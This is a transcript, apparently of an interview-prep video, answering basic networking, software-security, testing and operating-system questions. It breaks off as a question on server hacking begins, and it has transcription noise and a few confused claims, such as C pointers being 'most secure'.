it can be transmitted either in one of
these particular manners it can either
be a unicast multicast or a broadcast so
what is unicost
unicast is when a message is sent from a
single user to a single receiver so one
to one right so
uh one machine talking to another
machine and nobody else so also known as
point-to-point communications one point
two one of the point if you have to send
information to multiple receivers then
you will have to send it using multicast
right so this is where
your multicast networking comes into the
picture so in our case uh let's assume
it's a network where there are there's a
class c network approximately 255 odd
machines
and within these there are two machines
that want to talk to each other
if they want to talk between each other
it would be a point to point
communication where they will utilize
unicast where only these two machines
will have visibility of that
conversation and the other machines will
not even realize that this conversation
is taking place
if
one machine wants to talk to multiple
machines
then the multicast comes into the
picture as the name suggests in this
mode of communication data is sent from
one or more or more
sources to multiple destinations
multicast uses the internet group
management protocol also known as the
igmp protocol to identify groups so
under this igmp protocol various groups
are created where machines
are subscribed to those particular
groups and whenever a message needs to
be sent through those groups
it will be identified by the igmp
protocol and then that particular
message will be sent to those multiple
machines that are members of those
particular groups
and then comes the broadcast
the third method is known as the
broadcast as it says it is going to
broadcast to all so this is one to all
that is communication between a single
user and it is going to be sent to all
the machines in that particular network
right so the three ways unicast is one
two one
multicast is one to many
and broadcast is one to all then
question number three
what is dns
dns stands for domain name system it is
like the internet's phone book that is
responsible for mapping the domain name
into its corresponding ip address and
let me give you an example over here
whenever we go and open up let's say a
browser a google chrome browser we type
in www.google.com
and then we press enter and magically
google comes in front of us the website
rather
now how does the computer know who
google is because as far as we are
concerned humans understand google and
words like that computers don't
computers
deal with binary zeros and ones right
and as far as internet is concerned they
will only deal with ip addresses and mac
addresses so how does a computer know
how to find google.com and where is it
located so the moment we type in
in the browser window in the address bar
google.com and press enter a dns query
is generated automatically by the
browser where a packet is sent to our
dns servers asking what the ip address
is so in short dns resolves domain names
to their corresponding ip addresses
there is a dns server which will have
this index
a database of all the domains associated
with their ip addresses
if one particular dns server does not
have that information that you're
looking for it may query another dns
server who may have that particular
response
so the first thing is when you type in
domain name
it gets resolved with the dns it
identifies the ip address corresponding
to that particular domain name and thus
allows the computer to route that packet
to the particular
server where that domain name resides
so in this scenario if you look at the
screen on the local pc you have typed in
cybersecurity.com
there is a dns resolution that a query
that goes to the dns server what is the
ip of cybersecurity.com the dns server
looks it up in its particular database
if it has the corresponding ip address
it will then respond back the ip
addresses 172.17.252.1
after which the packet is sent off to
cybersecurity.com moving on to question
number four what is a firewall
now this is a very good question and
normally a very basic answer that i've
ever heard is that a firewall is a
hardware and a software firewall but
that's the functionality of a firewall
that is what how you can install a
firewall but there are different types
of firewalls and there is a specific
functionality that the firewall is
created for
right so firewall
is either a hardware or software
but its responsibility is for blocking
either incoming or outgoing traffic
from the internet to your computer they
secure a network so essentially the
firewall will allow a connection to
happen or disallow a connection to
happen it won't go beyond that that's
the basic functionality of a firewall
okay so based on the configurations that
you have done based on the rules that
you have created on the firewall it will
then based on those rules identify
whether some traffic is allowed in that
network or some traffic is
to be blocked from entering that network
so as the screen shows
the firewall rules will analyze whether
the traffic is good
if yes it will allow if the traffic is
bad it will block the traffic and not
allow that connection from happening in
the first place
now there are few common types of
firewalls that also need to be included
in the answer to this question and the
first one is a packet filtering firewall
these are the most common types that you
will come across which analyze packets
and lets them pass through only if they
match and establish security rule set
now here people do get confused when we
say that we analyze packets
people think that these firewalls will
analyze the contents of that packet
which is not correct
when the definition for a packet
filtering firewall says that these
firewalls analyze packets it means that
they are only analyzing the source and
destination ip addresses port numbers
and the protocols that are mentioned in
those packets
these firewalls do not have the
capability of deep packet inspection or
dpi as it is known if that capability
comes into the picture you are basically
looking at an intrusion detection system
or intrusion prevention system in
today's world called as a next gen
firewall
okay so a packet filtering firewall
essentially will only analyze data
packets for its source and destination
ip addresses port numbers and the
protocol that is being utilized it will
then map that information to the rules
that are there on the firewall
and based on those rules it will either
allow that a collection to happen or
disallow that connection from happening
the second type of is a proxy firewall
these firewalls filter network traffic
at the application level so when you say
application level they work at the layer
7 of the osi model packet filtering
firewalls since we have mentioned that
they've worked on ip addressing and port
numbers will work on
the network layer of the osi model also
on the transport layer because you also
look at protocols
proxy firewalls will work at layer 7
which is the application layer of the
osi model and will deal with application
level protocols such as http https ftp
smtp and so on so
forth and the third one is a stateful
multi-layer inspection firewall these
filter packets are the network transport
and application layers so they basically
do
the job of the first and the second type
of firewalls
the packets are compared to known uh
trusted packets but now the first
question is if there is a stateful
multi-layer inspection firewall why do
we have type one and type two firewalls
like packet filtering and proxy proxy
firewalls that is because that is how
the firewalls have evolved we started
off with the packet filtering then we
added functionality to it and so on so
forth
so if a question comes what is the
firewall you start off with the
option saying it is a hardware or
software this is the responsibility the
functionality of a firewall is to allow
good traffic and disallow bad traffic
based on the rules that have been
configured on the firewall and then
you've got basically three types of
firewalls packet filtering proxy and
stateful multi-layer and just include a
brief description of each of these
firewalls if getting your learning
started is half the battle what if you
could do that for free visit skill up by
simply learn click on the link in the
description to know more
then moving on to question number five
what is a vpn
vpn is also called a virtual private
network it is a connection between a vpn
server and a vpn client
so it basically creates an encrypted
term between the client and the vpn
server which is then utilized to
secure the connections that you're
making with the internet so as you can
see in the diagram
the user has a vpn client installed on
their machine the vpn client then
creates an encrypted tunnel to the vpn
server
and through this tunnel encrypted data
is transmitted which can then be
processed by the vpn server
uh sent to the internet information can
receive can be received back by the vpn
server the vpn server will encrypt that
data back and send it back to the user
so if there is a man in the middle
attack that is happening or a hacker
trying to eavesdrop on the
communication mechanism they will not be
able to do so because of the encrypted
terminal it is very difficult to decrypt
this or hack through this encrypted
tunnel
it is possible but it is very difficult
to achieve that moving on to question
number six what are the advantages of
distributed processing
now before we go into advantages of
distributed processing we first have to
understand what is distributed
processing
so it is a term which describes various
computer systems
that use more than one processor to run
an application
here multiple computers across different
locations
share the same processor the advantages
of distributing processes are as follows
but before we go into the advantages
distributed computing is basically where
multiple machines will pool their
resources together to run a singular
application so an application that has
multiple resources and can scale up and
scale down as and when required
the advantages are
that it can be very very useful in data
recovery
for example raid
where you're striping data on various
hard disks it is reliable
it is cheaper lower cost can be achieved
and it is easy to expand because of the
scalability factor that we just talked
about if there is loss of data in one
computer it can then be recovered by
another interconnected computer and one
of the examples would be blockchain in
today's world right what is blockchain
that this data is uh created live and
stored on a connection of computers so
if one of the computers goes offline the
other computers in that network will
still have that data
and there the blockchain will still
function without any issues the second
point a glitch in one machine does not
affect the processing as there will be
multiple other machines like we
discussed in the blockchain
several cost effective mini computers
are used instead of costly or mainframe
machines so instead of having a server
bank
i can have multiple machines connect
interconnected together
and they can function
in that particular blockchain or for
that particular distributed processing
mechanism
depending on the amount of data
processing more computers can be
attached to the network thus you can
increase the number of computers that
can be a part of that blockchain or you
can reduce them as and when necessary
moving on to question number seven what
is tcpip
tcpip or transmission control protocol
over internet protocol is a set of
communication protocols that are used to
interconnect networking devices on the
internet this protocol defines how data
should be transmitted over the internet
by providing end-to-end communications
so essentially if you want networking to
be established on your machine you will
need tcp
without tcp ip there will be no work
groups there will be no domains
basically your interconnectivity will go
for a toss
tcp is a software that once installed on
your machine will then interact with the
hardware which is your network interface
cards and then your switches wires
cables and all those through protocols
that have been already pre-configured in
it so within the tcp suite of softwares
you will have all the protocols all the
functionality of the osi layer
and each and every protocol that works
on each and every layer will be
predefined and pre-configured to work in
a particular manner the internet
protocol is all about routing each
individual packet to make sure it
reaches its destination so with the tcp
you're talking about the protocols that
will allow you to format the data and
generate it so that you can communicate
it over the network the ip will then
deal with the routing of those packets
so that the packet can be routed to the
correct computer and be received by the
recipient
so the tcpip model is the compressed
version of the osi the seven layers will
get converted into four layers the
network access layer internet layer
transport layer and application layer
going on to question eight
what do you mean by ipconfig and
ifconfig both of these are commands the
first one on a windows machine the
second one on a linux machine
so ipconfig is known as the internet
protocol configuration this is a command
that is used on the command line
interface of microsoft windows to view
all the adapters and the configuration
of each and every adapters for their
network interfaces so as you can see on
the right hand side in the command
prompt screen if once you type in the ip
config command on the c prompt and press
enter it will give you a list of all the
adapters that are there
so you can see wireless lan adapter
local area connection the media is
disconnected it doesn't exist at the
bottom you will see the wi-fi connection
wireless lan adapter and can give you
the ip version 6 ip address ip version 4
address the subnet mask and the default
gateway so this is the configuration
that allows the machine to know on what
network it is on what is the default
gateway for communicating to the
internet what is the subnet mask so how
many computers may exist in that
particular network and what is the ip
address of that specific computer so
that it can communicate across the
network as well ifconfig is the same
thing on the linux mac or unix operating
system
so
the command will also give you the list
of interfaces and the configuration of
each and every interface
it is used to configure control the tcp
network interface parameters from the
command line interface
it allows you to see the ip address of
these network interfaces so here you can
see
the
wlp19s
the ipr is 192 168 43.215
subnet mask being 255.255.255.0
with the broadcast being 192.168.43.255.
question nine
what is the difference between a domain
and a work group this can be a very
interesting question and can be a very
lengthy question at the same time a work
group is nothing but a decentralized
network where you have
interconnected multiple machines
together and each machine acts in its
own individual capacity
thinks of itself as a server right
so a decentralized network use every
user manages the resources individually
on their pc so local users on their own
pcs
managing
the network shares what can be shared
from that particular machine what data
should be shared should not be shared to
whom it can be shared with and so on so
forth
it is good if you've got a small network
a few machines all together
and you want them to interact with
minimal management effort
right so each computer each user will
decide what they want to allow other
users to see on that particular network
and all of them would be connected over
a lan a local area network either a
wireless or a wired one so if you look
at your home wi-fi right now that is one
of the best examples of having a work
group
the domain on the other hand is a
centralized network model so in a
corporate environment whenever you go
there and you got a domain based
username and password which
when entered onto a particular machine
gives you access to the entire network
or whatever applications and whatever
resources have been allocated to you
that is where the domain comes in so it
also uses a single sign-on mechanism for
all the resources that are made that are
to be made available to you whereas in a
work group your local user only meant
for that particular computer right so
coming back to the domain it is an
administrator who's going to manage the
entire domain and all of the resources
connected to the domain the resources
could be switches routers servers data
stores applications web servers mail
exchange servers and so on so forth so
all of these are administered by an
administrator through the domain
it is the most reliable and optimum
solution for a large network where
multiple users are going to interconnect
and share that data amongst each other
right the computer can be connected to
any network that means you can be on the
internet and through the internet using
a vpn you can connect to your corporate
network authenticate in and get access
to whatever resources you are allowed to
access whereas in a work group you have
to be a part of that network to access
that particular network if you change
your location you go and connect to
another wi-fi you will lose access to
your previous wi-fi then the last
question for the networking uh section
what is data encapsulation in networking
data encapsulation refers to the process
of adding headers and trailers to the
data
the data link layer binds each packet
into a frame that contains the hardware
address of the source and the
destination computer so in this example
when you're talking about data
encapsulation we have talked about how
data that has been created by the
application layer we'd have a header
and a trailer that will give
the various informations of where that
data needs to be sent so the hardware
address which is the mac address comes
into the picture and gets added to the
header and the ip addresses port numbers
and all of those things would then be
added to this uh traders as well so that
the data can be then routed to the
intended recipient of that particular
communication
with this we end the first 10 questions
in networking and in this video we are
going to look at software and
programming so we're going to look at
the first 10 questions
first question being how do you keep a
computer secure now this is going to be
a very generic question so you want to
put your best foot forward and you want
to identify the most common
methodologies on how you can keep a
computer secure
so when you talk about computers the
first thing that you want to talk about
is authentication mechanisms where you
want multi-factor authentication or
two-way authentication to ensure that
your accounts are kept secured now if
you look at using passwords depending on
how passwords are being stored by the
application uh password attacks can
be possible either a brute force attack
or a dictionary based attack
uh or even password guessing attacks are
possible to mitigate those kind of
attacks you we need multi-factor
authentication
to ensure that
accounts are kept secure
now even if we are using multi-factor
authentication we also want to look at
secure passwords
which means
that the password is complex enough to
withstand most of the common attacks and
a brute force attack or a dictionary
attack is just not possible so we want
to randomize our passwords we want to
create a complexity where a password
meets standards such as
me has at least one lowercase one
uppercase character has numerics and
special characters and is randomized is
not based on a dictionary word doesn't
contain usernames email addresses phone
numbers or anything that is personal to
that particular user
third keep regular updates which means
that there will be patches that will be
released for the application for the
software that you're utilizing download
the patches install them on a regular
basis to ensure that you are secured
against the most recent attacks that
have been identified
install a good antivirus
could be an internet security suite
which will have an antivirus intrusion
detection system a firewall
and will help you protect yourself
against ransomwares malwares
and any script-based attacks
also have a specialized firewall on your
system could be a host-based firewall or
a network-based firewall to ensure that
attacks are kept at a minimum and you
have your network definitions in place
to allow or disallow connections from
happening to your devices
have anti-phishing software installed as
well to ensure that you are not getting
any spam mails even if you do you are
able to identify that
and not fall pre or victim to those spam
mails
phishing attacks are generic
where they are directed towards
individuals
and they prey
on the gullibility of that particular
individual so our nigerian frauds or the
lotteries that we win on a regular basis
of hundreds of million dollars
those messages the emails that we
receive they are all phishing emails
where uh they're basically
prone to victimize the user and then
drop them off money or
install some malware
or do some other malicious activity if
you want to enhance encryption about
data that you have stored on your
devices or on your or that is accessed
by your software or being transmitted by
your software use encryption encrypt
your data whether it is at rest whether
it is in motion or whether it is at use
thus reducing data leakage and data loss
possibilities and finally in the
foremost secure your dns dns is the
domain name server which is utilized
by
computers to resolve domain names to ip
addresses
if a dns poisoning attack is possible
where your dns settings have been
modified by an attacker and you are
redirected to a malicious dns server
that server is going to redirect you to
another malicious application which may
have a malware or a malicious software
as a payload
also you don't want people to know your
dns servers and the queries that you're
making so you want to use secure dns or
dns over https to encrypt your dns
queries as well
so in a nutshell if you follow these
eight steps
your devices your computers your
applications are going to be as secure
as possible the next question discuss
security related aspects between cc plus
plus and java now this is an open-ended
question it depends on which level
you're giving an interview on but you're
looking at it from a fresher's
perspective
or a less experienced perspective
and thus these are some of the aspects
that we want to look at and the
comparisons between c c plus plus and
java so the five aspects that we are
looking at are pointers code
translations storage allocation
inheritance
and
overall security are based on cc plus
and java so when we say pointers
we are looking at
how we are going to uh uh we are using
pointers and
stacks and heaps to point to functions
and how we exit those functions and
how those
functions are then recalled into the
next function so c supports pointers it
is most secure c plus plus also supports
point pointers but it is a little bit
less secure than c java it is not
supported target access is given to
memory allocation and thus it is the
least secure as far as pointers are
concerned when we look at code
translations
c
is able to compile but it is not secure
same with cc plus plus but in java it
does an interpreted language and it is
abstracted and secured
in storage allocation in c we use malloc
and uh catalog memory allocation
which is less secure because it does not
have internal checks on
verifying what memory is allocated and
the user input that is being compiled or
that is being input to that memory right
thus this can allow buffer overflow
errors uh to creep in because of the
non-verification of the input data
so it is the least secure in cc plus
plus it uses
new and delete options and is
comparatively secure but java uses a
garbage collector and does is the most
secure as far as storage allocation is
concerned
when we talk about inheritance
the most secure is ccp plus plus c has
no inheritance so it's not secure in c
plus plus it is supported
does it is the most secure whereas in
java there's multi inheritance that is
not supported and does is comparatively
secure overall the most secure out of
all these based on these five aspects is
java
the least secure is c
and the mid level is c plus plus moving
on to question 13 what are the different
sources of malware now malware stands
for malicious software right
malware is basically a software that
poses as a legitimate software but has a
payload of a trojan virus spyware
keylogger or some malicious software
that is going to have
a negative impact on security of your
particular device
so the question here is what are the
different sources of malware we want to
identify the most common sources through
which malwares infect end user devices
in today's world and you can start with
pop-up ads
so most of the websites if you're
visiting untrusted sites if you're being
redirected to sites that you don't know
about there'll be a lot of pop-ups
coming your way where it says you're the
one millionth visitor to this site
please click here to download your gift
or it will say uh congratulations on
winning a particular product for
visiting this page and so on so forth
there are some instances where you can
see a banner which is flashing at you on
top of the page and says that there are
eight
uh infections that have been identified
on your computer click here to download
an antivirus to clean the infections so
all of these pop-ups
are there as a social engineering attack
as a phishing attack to make gullible
people click on those links and download
those malwares now the software that is
posing as a security software itself can
be a malicious software which is going
to install a trojan or a virus or a bot
on your machine compromising the
security of that machine
the second is removable media usbs and
humans have a fascination with usb so if
you find a usb lying around
it's a free usb you get excited about it
and you want to
take it home you want to plug it into a
machine and see what's on the usb worst
case scenario you format it and you've
got a free usb to utilize higher the
capacity the better but that is one of
the most easiest way people
use malwares to
uh to be deployed on unsuspecting users
if there is a usb lying around
why would why would somebody want to
forget a usb it's most likely planted
over there as a social engineering
attack so that a gullible person is
going to pick it up
plug it into their device if the device
is not secured enough
it is going to install the malware
right
then documents and executable files this
is where your viruses and all those
keeps in so let's say you're surfing on
the internet you're looking for a
software
uh and you find the software on a
particular website you do not verify the
trustworthiness of that site
and you just download and install that
software now that software could be uh
malware as well
does if you're surfing on the internet
you're downloading files from different
locations you have to research the
website you have to research the source
to ensure that it is trustworthy and
only then are you going to download and
execute those files thus internet
downloads as well and when we say
internet downloads it's not just
untrustworthy sites we go to torrents
we go to uh
the dark web or the deep web and we are
searching for other softwares especially
those who are researching security right
we always want we are always on the
lookout of new softwares and we are
always on those forums which may not be
so much trustworthy
and we just download those files and
start installing them that is a very bad
scenario right so you have to be very
careful what you are downloading from
the internet your antiviruses your
anti-phishing mechanisms your threat
intelligence mechanisms uh have those uh
mechanisms installed and you want to
verify where your downloads are coming
from then your network connections if it
is a p2p connection it is a local area
network connection or a metropolitan
area network you have to verify whom
which devices are connected to your
machines and you have to validate those
connections before you want to trust
those devices uh and before you connect
to them
if you're on a public wi-fi you probably
don't want to connect to a public wi-fi
in the first place
then comes email attachments
there are so many attachments that come
across in today's world most of them in
a zip format or a rar format
some of them come as document files
where there are macros hidden within
them macros are scripts that are
recognized by microsoft office files
right
and then finally there are these
malicious advertisements that we find
online right uh let it be facebook let
it be whatsapp let it be
any social media platform that you go or
even your search engines
their job is to display ads their job is
not to verify whether the ad is legit or
not it is for us as consumers to be
careful and validate that ad and verify
whether it is a genuine ad or not so
just don't start clicking on
uh any of the ad trusting uh the
platform that you're on
be
sure that you are investigating that so
these are the most common
sources of malware and the end user
will always get infected by one of these
mechanisms moving on to question 14
how does email work
now this is a very uh
can be a complex question
uh but we have to keep it as simple as
possible and we have to identify that
there are
two servers
while both of them either using smtp
which is a simple message transfer
protocol
where
in this scenario john
wants to send an email thus they've got
an email client installed on their
machine which is connected to the mail
exchange server which has a dns server
which maps
the routing and which maps the exchange
server and inboxes
so when john composes that message and
clicks on send
john should be connected to a mail
exchange server where the email is sent
through that particular person's inbox
so john's inbox will then
uh be validated and that email will then
be sent through the dns server uh
through the internet and will be
received by the recipient mail server so
at this point in time john also requires
the recipient's
email address so in this case this is
jack so jack something dot com would be
the email address so while john is
composing uh the two field will have
jack's email address the from field will
have john's email address the subject
field will have whatever they want to
convey as a message the message body
will have the message itself and then
when uh john clicks on send it will go
to direction server the exchange server
will then validate the inbox and
identify where that inbox is located for
jack and then to the internet it will be
sent to the uh to the mail server of
jack
the mail server will then identify the
proper
inbox that it now that that email needs
to be sent to and it will store that
email in that particular inbox
when jack opens their computer
and accesses their inbox this email from
jon will be already waiting for them and
they can respond to it the same way john
had sent that email
if getting your learning started is half
the battle what if you could do that for
free
visit scale up by simply learn click on
the link in the description to know more
moving on to question 15 what are the
types of threats a company can face
right and this is where your threat
modeling comes into the picture so
you're looking at software as you're
looking at operating systems and the
company comes and asks you
uh what are the threats that are most
likely that a company will face so on a
broader scale the threats that a company
will always face would be classified as
natural threats man-made threats
technical threats and a supply system
threat so a natural threat would be an
act of god which is outside the control
of human beings could be
storms or any natural occurrences like
volcanoes
thunderstorms flooding
earthquakes fire
and so on so forth so anything that is
natural so it depends on the geographic
location that you're in
and what kind of climate that area faces
and you need to identify the immediate
threats
and prepare for them so if it is
flooding that you're looking at
and you want to look at an office
and the possibility of the office
getting flooded is real you probably
want to
take office at a higher floor
so that the threat of flooding is
minimized
for fire we always have a fire drill
where we practice our fire mechanism so
that we can evacuate all humans as soon
as possible and then worry about the
technicalities of it under any
circumstances under any threats humans
will always have the first priority and
then everything else comes in
manmade threats are where man themselves
are a problem so strikes lockouts
hackers
theft
uh war
rioting
all of those are man-made threats uh
which
we ourselves cannot be in control of but
we need to plan for them and we need to
have
uh a business continuity plan or a
disaster equity plan for any of these
threats that have been identified
then come the technical threats
technical could be software bugs
operating system bugs application bugs
that
that come with the applications that we
have or a hardware failure where a
server crashes a hard disk crashes
maybe
the processor stops working the
motherboard stops working ram gets
corrupted
uh
any of the technical aspects
a stopping uh stop functioning does
creating a break in the business can
come under technical right so
uh anything to do with computers
let's say
a server failing or a
patch that is not installed on the
particular software those would come
under technical threats and then the
supply system the supply system are your
environmental threats which require
depend on your supply chain field
failures what is the supply chain for
office to function there are a lot of
dependencies that office goes through
right there are a lot of other vendors
that suppose that support and provide
critical infrastructure non-critical
infrastructure for the office to
function for first and foremost
electricity
without electricity nothing is going to
be powered on and you're not going to be
able to function so if there is an
electricity service provider and if
there is an electric outage that's that
comes under supply system
so that's a supply chain failure where
the vendor that provides electricity to
you has failed in providing that
particular service and now you need a
business continuity or a disaster
recovery plan so you probably have an
inverter or you already have a power
generator plant that is going to
generate your own power and supply to
your system
right they could be short circuits
because of fluctuation in the
electricity uh maybe the internet
service provider fails and your internet
caches so you have a backup line for the
internet from a different vendor right
and so on so forth maybe your hardware
vendors who are supplying you servers
desktops laptops and whatnot they fail
because they feel they are facing a
strike or they go bankrupt and suddenly
you can no longer purchase hardware from
your vendor because they no longer are
in business so that's a supply chain
failure
so any of these systems failing would
also come under threats
so under a broad category these are the
first four threads that you need to
identify and then you can elaborate by
providing more scenarios based on the
experiences that you have had towards
each and every of these threats so
natural threat where you may have had
experience where there would have been
let's say flooding
uh or
any natural disaster which caused a
problem for the continuity of your
particular business so identify each and
every example for each of these threads
and provide that as an example in the
interview
what is black box and white box testing
so when you are testing a software or
you are testing your infrastructure
there are two different
tests that you can conduct the first one
is a black box the second one is a white
box in a black box test there is no
knowledge that is shared with the tester
so let's say you're an ethical hacker
and you have been awarded a contract by
an organization to test the current
application that they have developed now
they are not going to give you any
information they are not going to tell
you what the application is they just
probably give you an ip address and a
port number where the application is
hosted and now you have to fire in your
own queries and try to figure out what
the application is try to gather
information see what uh what information
can be gathered in the first place and
based on that you're going to figure out
your way identify your vulnerabilities
and see if any of those vulnerabilities
can lead to an security incident so
without any knowledge zero knowledge of
the id infrastructure or the source code
that's a black box attack or a black box
test a white box test on the other hand
is where full knowledge of the iit
infrastructure or the source code is
shared
so the ethical hacker has complete
knowledge
and based on the knowledge they are then
going to test out the system to see if
there are any flaws that they can
identify right so
why would these two audits be important
because the first one a black box audit
emulates the attack of a outsider a
external hacker sitting outside the
organization trying to figure their way
in whereas a white box attack can
emulate the attack of an insider so a
disgruntled employee within that
organization misusing their access
controls or the access rights
to make uh unvalidated profits right so
somebody's corrupt who has been bribed
who wants to sell out company secrets
based uh so they're going to try to find
out vulnerabilities try to steal data
and try to sell it on the uh gray market
right so a white box would emulate a
internal attack a black box would
emulate an external attack moving on to
question 17 what is use case testing
now use case testing is a functional
test
and it is also a black box test
right what is a functional test it tests
the functionality of a particular
software once it has been created
why is it a black box test because the
user doesn't know what the functionality
is they just want to find out each and
every scenario and try to see what that
scenario
generates as a response they are not
sure whether that is the appropriate
response that should be generated or not
they're just trying to find out the
response that is going to be generated
after they fire off a query so this
technique is used by testers to get the
test scenarios to exercise the whole
system from start to finish
so let's say it's a login mechanism for
an application right now a user
at this point in time the tester since
it's a black box testing will know that
it is a login mechanism they will not
know the details of what logging
mechanisms are being utilized so they
wouldn't know whether uh input
validation is done they wouldn't know
whether output encoding is done they
wouldn't know how the cgi calls are
being made they will not know how the
queries are handled at the server side
and how the database is going to treat
that particular query so they have no
idea whether the sql injection attacks
are possible and so on so forth so for
them with whatever input they are going
to try to insert
for that login mechanism that's a
functional black box test the
functionality being whether the login
mechanism works and based on the type of
inputs that are going to put in whether
it creates an unwarranted output whether
they can bypass the mechanism or they
can uh hack into the system because of
some of the flaws that were left behind
right another example here is a software
made for users to use for documentation
the testers will test all the cases that
the user can do so can the user view a
document can they add new documents can
they edit documents and can they delete
documents
so this functionality
will depend upon the access controls
that have been granted to a particular
user so for this particular user the
tester at this point in time they would
not know whether they're an
administrative user or they're a regular
user they'll just try to do all of these
and then write the responses saying i
was able to view i was able to add i was
able to edit and i was able to delete
now the result will be then sent to a
manager the manager will look at the
results and then based on the actual
access controls that were supposed to be
there for this particular user then
we'll try to identify whether this is an
acceptable case or whether there were
any flaws within this case
moving on to question 18
what is static and dynamic testing now
this is again in application testing
static testing is done in an early stage
of development life cycle now software
development life cycles there are
multiple of those what are these life
cycles
there are different stages in which a
application is
created
and provided to the customer so your
first stage would be determining the
scope of the application determining the
hardware requirements for that
application then
creating a flowchart for that
application a functional chart for that
application and then maybe start coding
then an architect comes in tests the
code verifies the code then the testing
phase comes in then the security testing
phase comes in
and then the user acceptance testing
comes in but
in every stage at the very earliest of
first stage a static test will always be
started
to see whatever code has been developed
whatever uh scope has been developed
whether that scope is going to be
correct or not this will include
walkthroughs and code review what is a
walkthrough a walkthrough is going
through documents that have been
generated and trying to find faults in
the documented journey that has been
talk that has been created so far so
let's say somebody has created a
workflow
or a flowchart for a program how the
functions are going to be called and how
they're going to be executed so a
walkthrough would be where uh all these
responsible people will walk through
that particular flowchart and find out
any flaws within that and then rectify
them
if there is any code that has already
been written this code will be reviewed
manually and
any flaws within that code would then be
identified static testing will always be
100 percent accurate in a very short
amount of time because it is immediate
uh you have created it and then the
expert is going to test it to see
whether everything is fine or not
right it is all about prevention
mechanism so since you are doing it at
the inception itself
if you find any flaw it gets immediately
repaired so this is about preventing
vulnerabilities from keeping into that
application at a later point in time
whereas dynamic on the other side is
done at the end of the development life
cycle so you have generated the
application everything is ready now you
want to do dynamic testing includes
functional and non-functional testing
functional testing is where the
application itself is being tested the
functions to see that all the parameters
that are given to the application are
functioning properly
non-functional testing would be where
security parameters
administrative parameters all of them
are being verified
right this is where your test case
scenarios come in
and
you're going to test each and every
scenario
by generating inputs and analyzing the
output that the application is going to
give you
dynamic testing is all about cure so
here you're going to identify
vulnerabilities report them to the
management and the management is then
going to figure out a way of patching
those vulnerabilities so that they can
be mitigated
moving on to the next question what are
the test levels in software testing so
as far as software testing is concerned
there are four test levels module
testing integration testing system
testing and the final one is acceptance
testing so in the testing phase of your
development life cycle the first thing
is a module test you're going to check
your routines your subroutines your
subprograms procedures that have been
written in a program so all your
functions all your
mechanisms for that application are
going to be tested when you go into
integration testing the software may
have been integrated with multiple
softwares there may be different api
calls coming in maybe a third-party
software on which you are
depending upon to supply for information
so all of these integration of various
softwares various apis are tested to
ensure that they are functioning
properly and there are no flaws errors
or mistakes left behind in the
integration of all of these softwares
then the system testing
is where the entire system so including
the hardware including the software
right it starts from the installation so
now the software is complete we know
which hardware we are going to support
for it we start by installing the
software and see whether the
installation is going to be completed
properly if there are any errors in the
installation process itself
then once it is installed the
performance of that particular
application
the
write speeds the read speeds on the hard
disk uh
the transaction speeds that the
application is capable of
the network dependencies that the
application may have all of those would
come under system testing and then the
acceptance testing which is basically a
quality assurance exercise
that
the application meets the client's
requirements so the client in the first
stage would have given the scope of what
needs to be achieved in the acceptance
testing you're verifying that that scope
has been met and the client requirements
uh have been met and you can assure the
client about the functionality and the
performance of that particular
application coming to the last question
in this
software programs
what are the valuable steps to resolve
issues while testing so in the previous
scenarios when you have started testing
now if you find out
when you execute a particular use case
and then you find out of law what would
be the steps that you would utilize to
address those particular flaws in those
tests the first step will always be
record then you're going to report it
and then you're going to introduce a
control process for it so when you say
record
you're going to create logs
and you're going to try to resolve all
the problems that have happened now when
you say resolve you're not going to
record the application but you're going
to test the system again and again to
ensure that whatever is being recorded
is accurate
and all the logs all the error
mechanisms all the dumps all of those
that have been generated due to this
particular log of this particular error
are being captured so that they can be
reported to the higher level managers so
the next step is once you have
eventually accumulated all these logs
and records you're going to report them
to the higher level managers who are
then going to investigate it and go back
to the developers trying to figure out
the best way to mitigate those
particular flaws so the report writing
needs also also needs to be accurate uh
it needs to be to the point uh it needs
to detail what the problem was it will
document all the steps that there were
that you took all the inputs that you
put in and it will also
record all the errors and it will also
record
all the mechanisms that were utilized
and the
errors that were regenerated
and that report will be given to the
higher level managers who can then
forward it to the developers who based
on those reports can draw start their
troubleshooting and then the control
mechanism comes in you're going to
define the issue management process so
this process needs to work in a
particular manner where you're doing a
test you're recording whatever is
happening you're creating a report out
of it you're sending it to the
management the management will then take
those reports study them take it to the
developers the developers will test
based on their criterias they might
interact with the testers at that point
in time to identify particular flaws
and then they might want to record that
application or develop a patch which
once installed
will mitigate that particular flaw and
then it can come back to the testing
phase again where you can repeat those
tests and validate that the flaw is no
longer existing
so these are the three steps that would
be uh utilized for testing purposes and
that brings us to the first 10 questions
on the software platform in the next
video we'll be looking at operating
systems and applications
the first question is on virtual memory
what exactly is virtual memory
for a computer we have two types of
memory the first is the primary memory
which is your random access memory which
is also known as a volatile memory and
the secondary memory is your hard disk
where your data is stored permanently
but for a computer when it has let's say
a 4gb memory or a ram as in this
scenario on your screen
it is going to replicate that and is
going to create another 4gb of virtual
memory on the hard disk and it is going
to use it in tandem along with the ram
so if the ram is insufficient the
processor is going to utilize the 4gb of
the virtual memory that is created on
the hard disk and it is going to swap
data from the ram to the hard disk
this can also be known as a page file
or a swap file the next question is what
are different scheduling algorithms now
the context for this question is you're
talking about a profi processor and
you're talking about how processors are
going to be fed to the processor and how
the process is going to treat these
processes so the first is
first come first serve so the process
which requests the cpu first gets the
cpu allocation first now whenever there
are processes that are being run by
different applications they make
requests for some cpu time
now in first come first serve the first
service or the first process that is
going to request some processing time
will get that much allocated to them
they will run through the process first
and the next and the next and so on so
forth
the second one is the shortest job first
this is the process where the shortest
execution time for that process
is calculated and that process is
selected first for the cpu
then there is parity scheduling this
scheduler selects the task to work as
per priority so there would be some
tasks that are marked with high priority
some would be normal and some would be
low so based on this high
normal or low priority
all the processes will be classified
higher priority will be dealt with
first then the normal and the least
priority
the fourth option is multiple level
queues where processors are assigned to
a queue based on the specific property
like process priority the size of memory
etc so it will be classified based on
the
attributes given to that particular
process and
multiple queues will be created and then
based on the attributes the processes
will be
processed by the cpu
then shortest remaining time the process
will be allocated to the task which is
closest to its completion so
look at it this way the process that
will take the least time to complete its
processing would be chosen first
and then the round robin method where
each process comes in turn gets an equal
share of time so if there are 10
processors
each process will be allocated a certain
amount of time
after which the next process will be
processed and so on so forth and it will
continue in a round robin fashion till
all the processes get executed
so in short six different scheduling
algorithms depending on how you how the
operating system deals with it
the next question is
what are the steps involved in hacking a
server or a network so this is more of
an ethical hacking question you're
looking at devices and for and the
interviewer asks you uh what kind of
steps are involved what are the
activities that you would do
in hacking a server or a network now
there are no specific steps that you
would define because every hack is going
to be unique but it has a hack can be
